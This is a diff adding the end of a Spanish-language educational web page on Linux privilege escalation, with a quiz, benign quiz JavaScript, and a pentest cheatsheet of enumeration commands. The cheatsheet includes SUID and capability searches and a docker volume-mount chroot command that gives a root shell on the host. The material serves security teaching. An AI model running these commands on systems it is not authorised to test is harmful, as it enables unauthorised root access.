+          <button class="quiz-option btn-block" onclick="answerQuiz(5, 'a', false, this)">A. Kernel exploit</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(5, 'b', true, this)">B. PATH Hijacking</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(5, 'c', false, this)">C. SUID abuse</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(5, 'd', false, this)">D. Docker escape</button>
+        </div>
+      </div>
+
+      <div id="quiz-result" style="display:none; margin-top:16px;">
+        <div class="card result-card">
+          <div class="result-emoji">🎓</div>
+          <div class="result-title" id="quiz-score-text"></div>
+          <div class="card-desc" id="quiz-feedback"></div>
+          <button class="btn btn-primary" style="margin-top:12px" onclick="resetQuiz()">Reiniciar Quiz</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- CHEATSHEET -->
+    <div id="cheatsheet" class="panel">
+      <div class="card">
+        <div class="card-title">📋 Cheatsheet Rápido</div>
+        <div class="card-desc">Comandos esenciales para copiar y pegar durante un pentest.</div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header open" onclick="toggleAcc(this)">
+          <span>🖥️ Sistema y Kernel</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body open">
+          <div class="terminal">
+<span class="cmd">uname -a</span>
+<span class="cmd">cat /etc/os-release</span>
+<span class="cmd">hostnamectl</span>
+<span class="cmd">cat /proc/version</span>
+<span class="cmd">dpkg -l | grep linux-image</span>
+<span class="cmd">sysctl -a 2>/dev/null | less</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>👤 Usuarios y Permisos</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">id && whoami && groups</span>
+<span class="cmd">sudo -l</span>
+<span class="cmd">cat /etc/passwd | grep -v nologin | grep -v false</span>
+<span class="cmd">cat /etc/group</span>
+<span class="cmd">getent passwd</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>🔐 SUID, SGID, Capabilities</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>
+<span class="cmd">find / -perm -2000 -type f 2>/dev/null</span>
+<span class="cmd">getcap -r / 2>/dev/null</span>
+<span class="cmd">find / -writable -type d 2>/dev/null | grep -v proc</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>⚙️ Procesos y Servicios</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">ps aux</span>
+<span class="cmd">ps aux --forest</span>
+<span class="cmd">ps -ef | grep root</span>
+<span class="cmd">systemctl list-units --type=service</span>
+<span class="cmd">service --status-all 2>/dev/null</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>⏰ Cron y Tareas Programadas</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">crontab -l</span>
+<span class="cmd">cat /etc/crontab</span>
+<span class="cmd">ls -la /etc/cron.*</span>
+<span class="cmd">find /etc/cron* -type f -perm -o+w 2>/dev/null</span>
+<span class="cmd">cat /var/spool/cron/crontabs/* 2>/dev/null</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>🌐 Red y Conectividad</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">ip a</span>
+<span class="cmd">netstat -tulpn 2>/dev/null || ss -tulpn</span>
+<span class="cmd">netstat -anop 2>/dev/null</span>
+<span class="cmd">cat /etc/hosts</span>
+<span class="cmd">arp -a</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>📦 Docker y Contenedores</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">docker ps -a</span>
+<span class="cmd">docker images</span>
+<span class="cmd">ls -la /var/run/docker.sock</span>
+<span class="cmd">cat /proc/1/cgroup | grep docker</span>
+<span class="cmd">docker run -v /:/mnt -it alpine chroot /mnt sh</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>Hecho con 💻 para la comunidad de ciberseguridad.</p>
+      <p style="margin-top:6px">Recursos: <a href="https://gtfobins.github.io" target="_blank">GTFOBins</a> · <a href="https://www.exploit-db.com" target="_blank">Exploit-DB</a> · <a href="https://github.com/carlospolop/PEASS-ng" target="_blank">LinPEAS</a></p>
+      <p style="margin-top:10px; font-size:11px; color:#555;">⚠️ Uso exclusivo para fines educativos y pentesting autorizado.</p>
+    </div>
+  </div>
+
+  <script>
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+      event.target.classList.add('active');
+      document.getElementById(tabId).classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function toggleAcc(header) {
+      const body = header.nextElementSibling;
+      header.classList.toggle('open');
+      body.classList.toggle('open');
+    }
+
+    function ctfNext(stage, correct, btn) {
+      const parent = btn.parentElement;
+      const buttons = parent.querySelectorAll('.quiz-option');
+      buttons.forEach(b => { b.disabled = true; });
+
+      if (correct) {
+        btn.classList.add('correct');
+        setTimeout(() => {
+          document.getElementById('ctf-stage-' + stage).style.display = 'none';
+          document.getElementById('ctf-stage-' + (stage+1)).style.display = 'block';
+          document.getElementById('ctf-stage-' + (stage+1)).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 900);
+      } else {
+        btn.classList.add('wrong');
+        parent.querySelectorAll('.quiz-option').forEach(b => {
+          if (b.getAttribute('onclick').includes('true')) b.classList.add('correct');
+        });
+        setTimeout(() => {
+          document.getElementById('ctf-stage-' + stage).style.display = 'none';
+          document.getElementById('ctf-stage-' + (stage+1)).style.display = 'block';
+          document.getElementById('ctf-stage-' + (stage+1)).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 1600);
+      }
+    }
+
+    function resetCTF() {
+      for (let i = 0; i <= 3; i++) {
+        document.getElementById('ctf-stage-' + i).style.display = i === 0 ? 'block' : 'none';
+      }
+      document.querySelectorAll('#ctf .quiz-option').forEach(b => {
+        b.classList.remove('correct', 'wrong');
+        b.disabled = false;
+      });
+    }
+
+    let quizScore = 0;
+    function answerQuiz(q, ans, correct, btn) {
+      const parent = btn.parentElement;
+      const buttons = parent.querySelectorAll('.quiz-option');
+      buttons.forEach(b => { b.disabled = true; });
+
+      if (correct) {
+        btn.classList.add('correct');
+        quizScore++;
+      } else {
+        btn.classList.add('wrong');
+        buttons.forEach(b => {
+          if (b.getAttribute('onclick').includes('true')) b.classList.add('correct');
+        });
+      }
+
+      if (q < 5) {
+        setTimeout(() => {
+          const next = document.getElementById('q' + (q+1));
+          next.style.opacity = '1';
+          next.style.pointerEvents = 'auto';
+          next.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 700);
+      } else {
+        setTimeout(() => {
+          document.getElementById('quiz-result').style.display = 'block';
+          document.getElementById('quiz-score-text').textContent = 'Puntuación: ' + quizScore + '/5';
+          const feedback = quizScore === 5 ? '¡Perfecto! Dominas los fundamentos del escalamiento de privilegios.' :
+                          quizScore >= 3 ? '¡Buen trabajo! Repasa las técnicas que fallaste.' :
+                          'Sigue practicando. Revisa los paneles de Fundamentos y Técnicas.';
+          document.getElementById('quiz-feedback').textContent = feedback;
+          document.getElementById('quiz-result').scrollIntoView({ behavior: 'smooth' });
+        }, 900);
+      }
+    }
+
+    function resetQuiz() {
+      quizScore = 0;
+      document.getElementById('quiz-result').style.display = 'none';
+      for (let i = 1; i <= 5; i++) {
+        const card = document.getElementById('q' + i);
+        card.style.opacity = i === 1 ? '1' : '0.35';
+        card.style.pointerEvents = i === 1 ? 'auto' : 'none';
+        card.querySelectorAll('.quiz-option').forEach(b => {
+          b.classList.remove('correct', 'wrong');
+          b.disabled = false;
+        });
+      }
+    }
+  </script>
+</body>
+</html>
